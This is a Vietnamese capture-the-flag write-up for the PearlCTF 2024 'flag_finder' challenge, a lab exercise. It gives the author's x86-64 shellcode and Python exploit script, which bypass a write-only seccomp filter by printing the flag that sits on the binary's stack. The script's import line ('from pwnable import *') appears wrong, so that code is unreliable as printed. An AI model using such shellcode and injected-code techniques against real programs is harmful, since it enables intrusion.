# [PearlCTF-2024] flag_finder
<p>Dòng 48, đọc tối đa 254 byte từ stdin vào vùng nhớ v15. Sau khi gọi sub_4012FD, chương trình thực thi nội dung tại địa chỉ v15.</p>

![alt text](/thanhlai/post/pwnable/image/post8/image.png)

<p>Hàm sub_4012FD thiết lập seccomp để hạn chế các system call được phép.</p>

![alt text](/thanhlai/post/pwnable/image/post8/image-1.png)

<p>Sử dụng công cụ seccomp-tools để kiểm tra các system call được phép sử dụng. Chương trình chỉ cho phép đúng một system call là write, tất cả syscall khác đều bị chặn (KILL).</p>

![alt text](/thanhlai/post/pwnable/image/post8/image-3.png)

<p>Khi nhập chuỗi "abcd", chương trình cố gắng thực thi nội dung tại địa chỉ v15. Do đây không phải shellcode hợp lệ, quá trình thực thi gây lỗi. Trong quá trình debug, quan sát thấy nội dung flag đã được lưu sẵn trên stack, bắt đầu tại địa chỉ rsp + 0x18.
Do chương trình chỉ cho phép syscall write, ta có thể viết shellcode đơn giản để đọc flag từ stack và in nó ra stdout.</p>

![alt text](/thanhlai/post/pwnable/image/post8/image-2.png)

```
    mov rax, 1          ; syscall write
    mov rdi, 1          ; stdout
    add rsp, 0x18       ; địa chỉ buffer 
    mov rsi, rsp        ; tham số 1 (địa chỉ chứa flag)
    mov rdx, 32         ; độ dài (giả sử: 32 byte)
    syscall
```

<p>Script exploit:</p>

```
from pwnable import *

p = process('./flag-finder')  

shellcode = asm(
	'''
	mov rax, 1        
    mov rdi, 1         
    add rsp, 0x18       
    mov rsi, rsp        
    mov rdx, 32        
    syscall
	''', arch = 'amd64'
)

p.sendlineafter(b'> ', shellcode)

p.interactive()
```

<p>Chạy script và lấy được flag thành công.</p>

![alt text](/thanhlai/post/pwnable/image/post8/image-4.png)